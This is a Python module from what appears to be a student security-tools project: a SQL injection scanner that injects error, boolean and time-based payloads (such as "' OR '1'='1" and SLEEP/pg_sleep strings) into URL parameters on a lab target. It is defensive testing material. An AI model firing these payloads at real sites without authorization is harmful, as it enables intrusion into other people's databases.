"""
modules/sqli_scanner.py

SQL Injection Scanner module for VulnScope Lite.
Owner: Salma

Standard entry point (agreed team interface):
    run_sqli_scanner(target, recon_data=None) -> dict

It only runs against web URLs that Recon (or whoever supplies recon_data)
already found and put in recon_data["urls"]. If there's no web service, or
no URL with parameters, this module reports "skipped" and does nothing.

Testing three simple types of SQL injection per parameter:
  1. Error-based   - does a bad-syntax payload leak a DB error message?
  2. Boolean-based - does a TRUE payload look normal but a FALSE payload
                     look different?
  3. Time-based    - does a SLEEP()-style payload make the response slow?

IMPORTANT: only use this against systems you own or are authorized to test
(e.g. Metasploitable 2 in an isolated lab).
"""

import time
import re
from urllib.parse import urlsplit, urlunsplit, parse_qsl, urlencode

import requests

MODULE_NAME = "sqli"
TIMEOUT = 8
TIME_DELAY_THRESHOLD = 4  # seconds slower than baseline counts as "delayed"

ERROR_PAYLOADS = ["'", "\"", "' OR '1'='1", "'--"]
TRUE_PAYLOAD = "' OR '1'='1"
FALSE_PAYLOAD = "' AND '1'='2"
TIME_PAYLOADS = ["' OR SLEEP(3)-- -", "' OR pg_sleep(3)-- -"]

# Common DB error messages that show the app leaked a SQL error to us.
ERROR_PATTERN = re.compile(
    r"you have an error in your sql syntax|warning: mysql|sqlstate\[|"
    r"unclosed quotation mark|postgresql.*error|sqlite3\.operationalerror",
    re.IGNORECASE,
)

# --- ANSI colors for the standalone CLI report (no extra install needed) ---
RESET = "\033[0m"
BOLD = "\033[1m"
GREEN = "\033[92m"
RED = "\033[91m"
CYAN = "\033[96m"
YELLOW = "\033[93m"


def _result(target, status, findings=None, errors=None):
    return {
        "module": MODULE_NAME,
        "target": target,
        "status": status,
        "findings": findings or [],
        "errors": errors or [],
    }


def _finding(param, name, severity, title, description, evidence, url):
    return {
        "module": MODULE_NAME,
        "type": "SQL Injection",
        "name": name,
        "severity": severity,
        "title": title,
        "description": description,
        "risk": "An attacker could read, modify, or exfiltrate database contents.",
        "recommendation": "Use parameterized queries / prepared statements.",
        "evidence": evidence,
        "url": url,
    }


def _build_url(base_url, param, value):
    parts = urlsplit(base_url)
    pairs = parse_qsl(parts.query, keep_blank_values=True)
    new_pairs = [(k, value if k == param else v) for k, v in pairs]
    return urlunsplit((parts.scheme, parts.netloc, parts.path, urlencode(new_pairs), parts.fragment))


def _has_web_service(recon_data):
    if not recon_data:
        return False
    return bool(recon_data.get("web_services") or recon_data.get("urls"))


def _get_urls_with_params(recon_data):
    urls = recon_data.get("urls", []) or []
    return [u for u in urls if "?" in u]


# ---------------------------------------------------------------------------
# One check per method - each returns a finding dict, or None if clean.
# ---------------------------------------------------------------------------

def _check_error_based(base_url, param, session):
    for payload in ERROR_PAYLOADS:
        test_url = _build_url(base_url, param, payload)
        try:
            resp = session.get(test_url, timeout=TIMEOUT)
        except requests.RequestException:
            continue
        if ERROR_PATTERN.search(resp.text or ""):
            return _finding(
                param, "Error-Based SQL Injection", "High",
                f"Error-based SQL injection in parameter '{param}'",
                f"Payload {payload!r} caused a database error to appear in the response.",
                f"payload={payload!r} url={test_url}", test_url,
            )
    return None


def _check_boolean_based(base_url, param, baseline_text, session):
    try:
        true_url = _build_url(base_url, param, TRUE_PAYLOAD)
        false_url = _build_url(base_url, param, FALSE_PAYLOAD)
        true_resp = session.get(true_url, timeout=TIMEOUT)
        false_resp = session.get(false_url, timeout=TIMEOUT)
    except requests.RequestException:
        return None

    true_len = len(true_resp.text or "")
    false_len = len(false_resp.text or "")
    baseline_len = len(baseline_text or "")

    # TRUE should look like the normal page; FALSE should look different.
    true_matches_baseline = abs(true_len - baseline_len) <= max(5, baseline_len * 0.02)
    false_differs = abs(false_len - true_len) > max(20, baseline_len * 0.05)

    if true_matches_baseline and false_differs:
        return _finding(
            param, "Boolean-Based Blind SQL Injection", "High",
            f"Boolean-based SQL injection in parameter '{param}'",
            "A TRUE condition matched the normal page while a FALSE condition changed it.",
            f"true_len={true_len} false_len={false_len} baseline_len={baseline_len}", true_url,
        )
    return None


def _check_time_based(base_url, param, baseline_time, session):
    for payload in TIME_PAYLOADS:
        test_url = _build_url(base_url, param, payload)
        try:
            start = time.monotonic()
            session.get(test_url, timeout=TIMEOUT)
            elapsed = time.monotonic() - start
        except requests.RequestException:
            continue
        if elapsed - baseline_time >= TIME_DELAY_THRESHOLD:
            return _finding(
                param, "Time-Based Blind SQL Injection", "High",
                f"Time-based SQL injection in parameter '{param}'",
                f"Payload {payload!r} made the response take {elapsed:.1f}s vs a normal {baseline_time:.1f}s.",
                f"payload={payload!r} elapsed={elapsed:.2f}s baseline={baseline_time:.2f}s", test_url,
            )
    return None


def _test_parameter(base_url, param, baseline_text, baseline_time, session, verbose=False):
    """Runs the three checks for one parameter and returns any findings."""
    findings = []

    if verbose:
        print(f"\n{BOLD}{CYAN}[*] Parameter: {param}{RESET}")

    error_finding = _check_error_based(base_url, param, session)
    if error_finding:
        findings.append(error_finding)
        if verbose:
            print(f"    {GREEN}[+] Error-Based SQLi        -> VULNERABLE{RESET}")
    elif verbose:
        print(f"    {RED}[-] Error-Based SQLi        -> not vulnerable{RESET}")

    bool_finding = _check_boolean_based(base_url, param, baseline_text, session)
    if bool_finding:
        findings.append(bool_finding)
        if verbose:
            print(f"    {GREEN}[+] Boolean-Based SQLi      -> VULNERABLE{RESET}")
    elif verbose:
        print(f"    {RED}[-] Boolean-Based SQLi      -> not vulnerable{RESET}")

    time_finding = _check_time_based(base_url, param, baseline_time, session)
    if time_finding:
        findings.append(time_finding)
        if verbose:
            print(f"    {GREEN}[+] Time-Based SQLi         -> VULNERABLE{RESET}")
    elif verbose:
        print(f"    {RED}[-] Time-Based SQLi         -> not vulnerable{RESET}")

    return findings


def run_sqli_scanner(target, recon_data=None, verbose=False):
    if not _has_web_service(recon_data):
        if verbose:
            print(f"{YELLOW}[*] No web service in recon_data -> skipping SQLi module.{RESET}")
        return _result(target, status="skipped")

    urls = _get_urls_with_params(recon_data)
    if not urls:
        if verbose:
            print(f"{YELLOW}[*] No URLs with parameters found -> skipping SQLi module.{RESET}")
        return _result(target, status="skipped")

    findings = []
    errors = []
    session = requests.Session()

    for base_url in urls:
        params = [k for k, _ in parse_qsl(urlsplit(base_url).query, keep_blank_values=True)]

        if verbose:
            print(f"{BOLD}[*] Target URL:{RESET} {base_url}")
            print(f"{BOLD}[*] Parameters:{RESET} {params}")

        try:
            start = time.monotonic()
            baseline_resp = session.get(base_url, timeout=TIMEOUT)
            baseline_time = time.monotonic() - start
        except requests.RequestException as exc:
            errors.append(f"Failed to fetch baseline for {base_url}: {exc}")
            if verbose:
                print(f"    {RED}! baseline fetch failed: {exc}{RESET}")
            continue

        for param in params:
            try:
                findings.extend(
                    _test_parameter(base_url, param, baseline_resp.text, baseline_time, session, verbose=verbose)
                )
            except Exception as exc:
                errors.append(f"Error testing parameter '{param}' on {base_url}: {exc}")
                if verbose:
                    print(f"    {RED}! error testing '{param}': {exc}{RESET}")

    return _result(target, status="success", findings=findings, errors=errors)


if __name__ == "__main__":
    # Run this file directly to test your module on its own, the same way
    # your teammates run "python recon.py" etc.
    #
    #   python sqli_scanner.py <full_url_with_parameters>
    #
    # Example (Mutillidae on Metasploitable2):
    #   python sqli_scanner.py "http://172.16.88.140/mutillidae/index.php?page=user-info.php&username=test&password=test"

    import sys
    from urllib.parse import urlsplit

    if len(sys.argv) < 2:
        print("Usage: python sqli_scanner.py <full_url_with_parameters>")
        print('Example: python sqli_scanner.py "http://172.16.88.140/mutillidae/index.php?page=user-info.php&username=test&password=test"')
        sys.exit(1)

    test_url = sys.argv[1]

    if "?" not in test_url:
        print("That URL has no query parameters - nothing for this scanner to test.")
        sys.exit(1)

    target_host = urlsplit(test_url).netloc
    demo_recon_data = {"urls": [test_url]}

    print(f"{BOLD}{'=' * 60}")
    print("VulCheck - SQL Injection Scanner")
    print(f"Target: {target_host}")
    print(f"URL:    {test_url}")
    print(f"{'=' * 60}{RESET}")

    scan_result = run_sqli_scanner(target_host, demo_recon_data, verbose=True)

    print(f"\n{BOLD}{'=' * 60}")
    print("SCAN SUMMARY")
    print(f"{'=' * 60}{RESET}")
    print(f"Status:   {scan_result['status']}")
    print(f"Findings: {len(scan_result['findings'])}")

    if scan_result["findings"]:
        print(f"\n{BOLD}--- VULNERABLE FINDINGS ---{RESET}")
        for i, f in enumerate(scan_result["findings"], start=1):
            print(f"\n{GREEN}[{i}] [+] {f['title']}{RESET}")
            print(f"    Severity:       {f['severity']}")
            print(f"    Description:    {f['description']}")
            print(f"    Risk:           {f['risk']}")
            print(f"    Recommendation: {f['recommendation']}")
            print(f"    Evidence:       {f['evidence']}")
            print(f"    URL:            {f['url']}")
    else:
        print(f"\n{RED}[-] No SQL injection findings for this URL.{RESET}")

    if scan_result["errors"]:
        print(f"\n{BOLD}--- ERRORS ---{RESET}")
        for e in scan_result["errors"]:
            print(f"  {RED}! {e}{RESET}")
